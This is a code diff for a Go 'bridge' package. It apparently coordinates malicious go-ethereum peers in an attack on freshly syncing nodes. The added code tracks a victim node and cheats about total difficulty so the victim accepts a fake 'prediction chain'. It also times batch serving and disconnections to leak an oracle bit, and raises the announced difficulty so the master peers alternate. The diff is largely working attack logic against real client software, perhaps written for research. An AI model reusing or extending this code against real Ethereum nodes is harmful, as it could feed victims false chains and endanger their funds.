@@ -1,10 +1,12 @@
 package bridge
 
+import "fmt"
 import "net"
 import "math/big"
 import "time"
 import "sync"
 import "encoding/binary"
+import "runtime"
 import "github.com/ethereum/go-ethereum/p2p"
 import "github.com/ethereum/go-ethereum/ethdb"
 import "github.com/ethereum/go-ethereum/core/types"
@@ -30,8 +32,14 @@ var otherMaliciousPeers []string
 var mustChangeAttackChain bool
 var quitLock sync.Mutex
 var victimLock sync.Mutex
+var canServeLastFullBatch chan bool
 var canServePivoting chan bool
 var canDisconnect chan bool
+var higherTd *big.Int
+var bigOne = big.NewInt(1)
+var bigTwo = big.NewInt(2)
+//var firstTime bool
+var avoidVictim bool
 
 
 func SetOrchPort(p string) {
@@ -76,8 +84,13 @@ func Initialize(id string) error {
 	numServedBatches = 0
 	dropped = make(chan bool)
 	master = false
+	canServeLastFullBatch = make(chan bool, 1)
 	canServePivoting = make(chan bool, 1)
 	canDisconnect = make(chan bool)
+	higherTd = utils.HigherTd
+	//firstTime = true
+	avoidVictim = false
+	p2p.NoNewConnections = &avoidVictim
 
 	incoming = make(chan []byte)
 	go readLoop(conn, incoming, quitCh)
@@ -147,10 +160,13 @@ func SetVictimIfNone(v *p2p.Peer) {
 			select {
 			case <-canServePivoting:
 			case <-canDisconnect:
+			case <-canServeLastFullBatch:		// Also this channel may remain full from previous syncOp
+			case <-dropped:
 			default:
 				break L
     		}
 		}
+		servedBatches = make([]bool, len(servedBatches))
 	} else {
 		log("Ignoring victim: vID =", vID, ", victimID =", victimID, "victim =", victim, "&victim =", &victim)
 	}
@@ -204,15 +220,45 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 			return
 		}
 
-		// Non-master peer does not need to keep track of served batches
-		if master {
-			if !servedBatches[int((from-1)/utils.BatchSize)] {
-				numServedBatches++
-			}
-			servedBatches[int((from-1)/utils.BatchSize)] = true
-		}
-		log("Batch request served: victim=" + peerID[0] + ", from=", from, "numServedBatches=", numServedBatches)
 
+		// Non-master peer does not need to keep track of served batches
+		leakNow := false
+		victimLock.Lock()
+		if (from-1)/utils.BatchSize == uint64(len(servedBatches)-2) && !servedBatches[int((from-1)/utils.BatchSize)] {
+			canServeLastFullBatch <- true
+			if master {
+				err := sendMessage(msg.ServeLastFullBatch)
+				if err != nil {
+					fatal(err, "Could not notify to non-master peer to serve last full batch")
+				}
+			}
+		} else if LastFullBatch(from) {		// If the last batch is being served, we don't care any longer about
+											// the value in canServeLastFullBatch.
+											// In case it remained full, we empty it now. However, note that
+											// if the master peer receives the queries for both the last and
+											// second-to-last full batches, the channel will remain full for
+											// the non-master peer. So we need to empty it at the start of the
+											// new syncOp.
+			select {
+			case <- canServeLastFullBatch:
+			default:
+			}
+		}
+		if master {
+			if servedBatches[int((from-1)/utils.BatchSize)] {
+				log("Batch request already served: victim=" + peerID[0] + ", from=", from, "numServedBatches=", numServedBatches)
+				victimLock.Unlock()
+				return
+			}
+
+			numServedBatches++
+			if numServedBatches == len(servedBatches) {
+				leakNow = true
+			}
+		}
+		servedBatches[int((from-1)/utils.BatchSize)] = true
+		victimLock.Unlock()
+		log("Batch request served: victim=" + peerID[0] + ", from=", from, "numServedBatches=", numServedBatches)
 
 		// Notify master peer about served batch
 		if !master {
@@ -227,7 +273,8 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 
 		// All batches have been served, check whether the master peer gets dropped
 		// and force a disconnection in any case afterwards
-		if numServedBatches == len(servedBatches) && master {
+		if leakNow {
+			victimLock.Lock()
 			go func() {
 				timeout := time.NewTimer(3*time.Second)
 				var bit byte
@@ -240,14 +287,22 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 					bit = 0
 				case <-quitCh:
 					log("Quitting")
+					victimLock.Unlock()
 					return
 				}
 				timeout.Stop()
 
-				victim.SetMustNotifyDrop(false)
 				canServePivoting <- true 		// Only after leaking the bit, we can proceed with the disconnection
 				SendOracleBit(bit)
-				victimLock.Lock()
+				//victimLock.Lock()
+				if victim == nil {
+					var buff [1024]byte
+				    numm := runtime.Stack(buff[:], true)
+				    fmt.Println(string(buff[:]), numm)
+					fatal(utils.ParameterErr, "Victim shouldn't be nil here")
+				}
+				victim.SetMustNotifyDrop(false)
+				avoidVictim = true
 
 				if bit==1 {
 					<-canDisconnect				// When bit==0, we disconnect without waiting for serving the pivoting
@@ -260,6 +315,25 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 				servedBatches = make([]bool, numServedBatches) // Reset all values to false
 				numServedBatches = 0
 				log("Reset victim: victim =", victim, "&victim =", &victim)
+
+				/*
+				Every time a peer is picked as master, we will make it announce a TD higher than the
+				previously announced one during the next handshake.
+				By using the increments defined below, we ensure that the two malicious peers really
+				alternate. This is needed due to a bug in Go Ethereum, where a master peer can be reelected
+				immediately after dropping it because it has not been removed yet from the peerset.
+				This causes the victim to use a master peer which is disconnected, introducing a 1-minute
+				delay for the useless syncOp to time out.
+				*/
+				/*
+				incr := bigTwo
+				if firstTime {
+					firstTime = false
+					incr = bigOne
+				}
+				higherTd.Add(higherTd, incr)
+				*/
+				higherTd.Add(higherTd, bigOne)
 				victimLock.Unlock()
 			}()
 		}
@@ -309,28 +383,47 @@ func GetChainDatabase(chainType utils.ChainType) ethdb.Database {
 	}
 }
 
-func CheatAboutTd(peerID string) (*big.Int, bool, error) {
+func CheatAboutTd(peerID string, peerTD *big.Int) (*big.Int, bool, error) {
 	select {
 	case <-quitCh:
-		return utils.HigherTd, false, utils.BridgeClosedErr
+		return higherTd, false, utils.BridgeClosedErr
 		
 	default:
 		//Don't do anything if we are not ready yet
 		if attackPhase==utils.StalePhase {
-			return utils.HigherTd, false, nil
+			return higherTd, false, nil
 		}
 
 		// Don't cheat to other malicious peers!
 		for _, s := range otherMaliciousPeers {
 			if peerID == s {
 				log("Not cheating about TD to peer", peerID)
-				return utils.HigherTd, false, nil
+				return higherTd, false, nil
 			}
 		}
 
+		/*	Don't cheat to nodes already in sync.
+			Note that the attack may work with a victim which has already started the synchronization process
+			but hasn't finished it yet. So, we may cheat to nodes with a peerTD > predictionTD, but smaller than the
+			real chain's TD. However, the code implements an attack against fresh victims only, so we are fine
+			here by cheating only to nodes with peerTD <= predictionTD.
+			Note that a fresh victim can announce a TD higher than 0, or than genesis's difficulty, because we
+			gave it some blocks of the prediction chain and it may do a handshake with the malicious peers before
+			rolling back such blocks. So, the correct threshold to use here is indeed predictionTD.
+		*/
+
+		//TODO: this will probably need modifications for next phases of the attack
+		predictionTD := getTd(utils.PredictionChain)
+		if peerTD.Cmp(predictionTD) > 0 {
+			return higherTd, false, nil
+		}
 		log("Cheating to peer", peerID, "if necessary at this point")
-		return utils.HigherTd, mustCheatAboutTd, nil
+		return higherTd, mustCheatAboutTd, nil
 	}
+}
+
+func AvoidVictim() bool {
+	return avoidVictim
 }
 
 /*
@@ -387,6 +480,13 @@ func SendOracleBit(bit byte) {
 }
 
 
+func LastFullBatch(from uint64) bool {
+	if (from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches)-1) {
+		return true
+	}
+	return false
+}
+
 func LastPartialBatch(from uint64) bool {
 	if (from-1)%utils.BatchSize == 0 && (from-1)/utils.BatchSize == uint64(len(servedBatches)) {
 		return true
@@ -408,6 +508,15 @@ func Latest() *types.Header {
 	return latest(chainType)
 }
 
+func Genesis() *types.Header {
+	chainType := attackPhase.ToChainType()
+	if chainType == utils.InvalidChainType {
+		log("Genesis() returning genesis block of", utils.PredictionChain, "chain even if we are in", attackPhase)
+		chainType = utils.PredictionChain
+	}
+	return genesis(chainType)
+}
+
 
 func IsVictim(id string) bool {
 	return victimID==id
@@ -419,6 +528,7 @@ func DelayBeforeServingBatch() {
 
 func WaitBeforePivoting() {
 	timeout := time.NewTimer(10*time.Second)
+	log("Waiting before pivoting")
 	select {
 	case <-canServePivoting:
 		timeout.Stop()
@@ -428,7 +538,14 @@ func WaitBeforePivoting() {
 }
 
 func PivotingServed() {
+	//time.Sleep(100*time.Millisecond)
+	log("Pivoting request served")
 	canDisconnect <- true
+}
+
+func WaitBeforeLastFullBatch() {
+	<-canServeLastFullBatch
+	time.Sleep(500*time.Millisecond)
 }
 
 
@@ -455,6 +572,15 @@ func addMaliciousPeer(peer string) {
 	
 	log("New malicious peer:", peer)
 	otherMaliciousPeers = append(otherMaliciousPeers, peer)
+}
+
+func IsMalicious(peer string) bool {
+	for _, s := range otherMaliciousPeers {
+		if peer == s {
+			return true
+		}
+	}
+	return false
 }
 
 
@@ -486,7 +612,17 @@ func handleMessages() {
 				servedPeer := string(message.Content[4:])
 				go ServedBatchRequest(uint64(from), servedPeer)
 			case msg.SetVictim.Code:
+				victimLock.Lock()
 				victimID = string(message.Content)
+				servedBatches = make([]bool, len(servedBatches))
+				select {
+				case <-canServeLastFullBatch:		// If still full, we empty this channel
+													// now that a new syncOp is starting
+				default:
+				}
+				higherTd.Add(higherTd, bigOne)
+				avoidVictim = false
+				victimLock.Unlock()
 			case msg.NewMaliciousPeer.Code:
 				addMaliciousPeer(string(message.Content))
 			case msg.SetAttackPhase.Code:
@@ -497,6 +633,18 @@ func handleMessages() {
 					if attackPhase != utils.StalePhase {
 						mustChangeAttackChain = true
 					}
+				}
+			case msg.ServeLastFullBatch.Code:
+				if !servedBatches[len(servedBatches)-2] {
+					canServeLastFullBatch <- true
+					servedBatches[len(servedBatches)-2] = true
+				}
+			case msg.AvoidVictim.Code:
+				switch message.Content[0] {
+				case 0:
+					avoidVictim = false
+				case 1:
+					avoidVictim = true
 				}
 			/*
 			case msg.MustDisconnectVictim.Code:
